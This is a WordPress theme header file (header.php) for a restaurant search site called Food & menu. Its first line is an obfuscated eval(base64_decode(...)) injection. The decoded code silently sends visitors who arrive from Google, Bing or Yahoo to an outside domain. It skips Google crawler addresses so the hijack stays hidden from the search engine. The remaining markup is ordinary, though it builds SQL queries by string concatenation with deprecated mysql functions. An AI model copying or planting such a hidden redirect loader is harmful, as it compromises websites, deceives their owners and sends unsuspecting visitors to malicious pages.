<?php eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOyBpZiAoIWhlYWRlcnNfc2VudCgpKXsgaWYgKGlzc2V0KCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkpeyBpZiAoaXNzZXQoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddKSl7IGlmICgocHJlZ19tYXRjaCAoIi9NU0lFICg5LjB8MTAuMCkvIiwkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10pKSBvciAocHJlZ19tYXRjaCAoIi9ydjpbMC05XStcLjBcKSBsaWtlIEdlY2tvLyIsJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKSkgb3IgKHByZWdfbWF0Y2ggKCIvRmlyZWZveFwvKFswLTldK1wuMCkvIiwkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10sJG1hdGNoZikgYW5kICRtYXRjaGZbMV0+MTEpKXsgaWYoIXByZWdfbWF0Y2goIi9eNjZcLjI0OVwuLyIsJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10pKXsgaWYgKHN0cmlzdHIoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddLCJ5YWhvby4iKSBvciBzdHJpc3RyKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwiYmluZy4iKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10pKSB7IGlmICghc3RyaXN0cigkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10sImNhY2hlIikgYW5kICFzdHJpc3RyKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwiaW51cmwiKSBhbmQgIXN0cmlzdHIoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddLCJFZVlwM0Q3IikpeyBoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vdWllcGZqbGVmLnJlYmF0ZXNydWxlLm5ldC8iKTsgZXhpdCgpOyB9IH0gfSB9IH0gfSB9"));?>
<?php
/**
 * The Header for our theme.
 *
 * Displays all of the <head> section and everything up till <div id="main">
 *
 * @package WordPress
 * @subpackage Twenty_Twelve
 * @since Twenty Twelve 1.0
 */
 session_start();
?><!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" <?php language_attributes(); ?>>
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" <?php language_attributes(); ?>>
<![endif]-->
<!--[if !(IE 7) | !(IE 8)  ]><!-->
<html <?php language_attributes(); ?>>
<!--<![endif]-->
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>" />
<meta name="viewport" content="width=device-width" />
<!--<title><?php wp_title( '|', true, 'right' ); ?></title>-->
<title>Food & menu</title>
<link rel="shortcut icon" href="http://www.foodandmenu.com/favicon.ico" type="image/x-icon"/>
<script type='text/javascript' src='http://www.foodandmenu.com/js/jquery.ui.totop.js'></script> 
<link rel="profile" href="http://gmpg.org/xfn/11" />
<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />
<?php // Loads HTML5 JavaScript file to add support for HTML5 elements in older IE versions. ?>
<!--[if lt IE 9]>
<script src="<?php echo get_template_directory_uri(); ?>/js/html5.js" type="text/javascript"></script>
<![endif]-->
<link href="<?php bloginfo('template_url'); ?>/style.css" rel="stylesheet" type="text/css" />
<?php wp_head(); ?>
</head>

<body <?php body_class(); ?> onLoad="init();">
<div id="page" class="hfeed">
<?php /*?>	<header id="masthead" class="site-header" role="banner">
		<hgroup>
			<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
			<h2 class="site-description"><?php bloginfo( 'description' ); ?></h2>
		</hgroup>

		<nav id="site-navigation" class="main-navigation" role="navigation">
			<h3 class="menu-toggle"><?php _e( 'Menu', 'twentytwelve' ); ?></h3>
			<a class="assistive-text" href="#content" title="<?php esc_attr_e( 'Skip to content', 'twentytwelve' ); ?>"><?php _e( 'Skip to content', 'twentytwelve' ); ?></a>
			<?php wp_nav_menu( array( 'theme_location' => 'primary', 'menu_class' => 'nav-menu' ) ); ?>
		</nav><!-- #site-navigation -->

		<?php $header_image = get_header_image();
		if ( ! empty( $header_image ) ) : ?>
			<a href="<?php echo esc_url( home_url( '/' ) ); ?>"><img src="<?php echo esc_url( $header_image ); ?>" class="header-image" width="<?php echo get_custom_header()->width; ?>" height="<?php echo get_custom_header()->height; ?>" alt="" /></a>
		<?php endif; ?>
	</header><?php */?><!-- #masthead -->
    
<!--<script type="text/javascript">
function validate(){
	if(document.getElementById('full_address').value == ''){
		alert('Please enter your address');
		document.getElementById('full_address').focus();
		return false;
	}
	if((document.getElementById('full_address').value == '') && (document.getElementById('rest_item').value!= '')){
		alert('Please enter your address');
		document.getElementById('full_address').focus
	}
	return true;
}
</script>-->
<?php include ("search_compete_area.php"); ?>

<div class="header_section">

<div class="header_top">
<div class="header_container">

<div class="logo_left">
<a href="http://foodandmenu.com/home.php"><img src="<?php bloginfo('template_url'); ?>/images/logo.png" width="216" height="99" /></a>
</div>


<div class="search_right">

<form name="frm_search" id="frm_search" action="http://foodandmenu.com/search_area.php" method="get">
<div class="search_box">

<div class="left_search">
    <p class="left_search">What are you looking for?<span class="left_search_two">( Restaurant, Cuisine )</span></p>
    <input name="rest_item" id="rest_item" type="text" class="search_textfield" value="<?php //echo $_REQUEST['rest_item']; ?>" />
</div>

<div class="search_two">
<p class="left_search"> Where?<span class="left_search_two">( City,State or Zip code )</span></p>
<input type="text" name="full_address" id="full_address" class="search_textfield" style="width:230px;" value="<?php //echo $_REQUEST['city']; ?>"  onfocus="if (this.value!='') this.value = ''" autocomplete="off" />
<div class="shadow" id="shadow">
<?php /*?><div class="output" id="output" <?php if($page=='restaurant.php' || $page=='profile.php' || $page=='review.php' || $page=='cart.php' || $page=='paymentdetails.php'){ ?> style="border: none;" <?php } else { ?> style="border: 1px solid #c9c9c9;" <?php } ?>><?php */?>
<div class="output" id="output" >
</div>
</div>
</div>

<div class="search_button"><input name="btn_search" id="btn_search" type="submit" value="search" class="button2"/></div>

</div>
</form>


</div>

<div class="clear"></div>
</div>

</div>
</div>

<div class="clear"></div>

<div class="menu_section">

<div class="menu_container">

<div class="left_menu">

<ul>
<li><a href="http://foodandmenu.com/home.php">Home</a></li>
<li><a href="http://foodandmenu.com/contact.php">Contact Us</a></li>
<li><a href="http://foodandmenu.com/vendor.php">vendors</a></li>
<li><a href="http://foodandmenu.com/blog" class="active">Blog</a></li>
<?php /*?><?php if(!isset($_SESSION['customer_id'])){?>
<div><a href="http://foodandmenu.com/login.php"><img class="chat_header" src="<?php echo bloginfo('template_url')?>/images/chat.png" alt="#" height="97"  width="104" style="margin:-142px 0 0 1009px; position:absolute; z-index:99999" /></a></div><?php }else { ?>
<div><a href="http://foodandmenu.com/customer_onlinechat.php"><img class="chat_header" src="<?php echo bloginfo('template_url')?>/images/chat.png" alt="#" height="97"  width="104" style="margin:-142px 0 0 1009px; position:absolute; z-index:99999" /></a></div>
<?php } ?><?php */?>
</ul>

</div>
<?php 
function get_qty_total(){
	$result=mysql_query("select sum(qty) as total_qty from `restaurant_cart` where customer_id = '".$_SESSION['customer_id']."'");
	$row=mysql_fetch_array($result);
	return $row['total_qty'];
}
?>
<div class="right_menu" style="width:auto;">
<?php if(isset($_SESSION['customer_id'])){
$sql_customer_name = mysql_query("SELECT * FROM  restaurant_customer WHERE  id = '".$_SESSION['customer_id']."'");
$row_name = mysql_fetch_array($sql_customer_name);?>
<div class="login_section" style="width:auto;">
<ul style="padding-left:15px; padding-right:15px;">
<li><span style="cart_text"><?php echo get_qty_total() ; ?></span>
<a href="http://foodandmenu.com/cart.php" style="float:left;"><img src="<?php bloginfo('template_url');?>/images/cart.png" width="20" height="20"  style="margin-top:5px; padding-right:5px;"/></a>
</li>
<li>Welcome , <?php echo $row_name['firstname']; ?></li>   
<li>|</li>  
<li><a href="http://foodandmenu.com/edit_profile.php">Edit profile</a></li>   
<li>|</li>  
<li><a href="http://foodandmenu.com/logout.php">Logout</a></li>
</ul>
</div>
<?php }else { ?>
<div class="login_section">
<ul>
<li><a href="http://foodandmenu.com/login.php">Login</a></li>   
<li>|</li> 
<li><a href="http://foodandmenu.com/signup.php">Sign up</a></li>
</ul>
</div>
<?php } ?>


</div>
<div class="clear"></div>
</div>

</div>

</div></div>

<div class="clear"></div>

<div id="main" class="wrapper">

<div class="body_section">
<div class="body_container">
<div class="body_top"></div>
<div class="main_body">
<div class="about_body_cont" style="display:table;">